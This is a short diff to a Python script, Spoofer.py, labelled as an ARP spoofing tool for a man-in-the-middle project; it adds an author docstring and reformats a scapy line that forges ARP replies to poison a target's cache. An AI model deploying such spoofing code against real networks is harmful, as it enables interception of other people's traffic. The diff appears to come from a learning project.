@@ -1,3 +1,13 @@
+"""
+Spoofer.py
+Desc: An ARP Spoofing tool created for use with a Man-in-the-Middle Project
+Author: Evan Quist
+
+ASCII Art By: https://www.kammerl.de/ascii/AsciiSignature.php
+Based on Tutorial By: https://www.thepythoncode.com/article/building-arp-spoofer-using-scapy
+
+"""
+
 from scapy.all import Ether, ARP, srp, send
 import argparse
 import time
@@ -22,9 +32,7 @@ def spoof(target_ip, host_ip, runs, bidirectional):
     target_mac = get_mac(target_ip)
     
     # Send the ARP Response, for both sides
-    target_arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
-    
-    
+    target_arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')  
     
     if(bidirectional):
             host_mac = get_mac(host_ip)
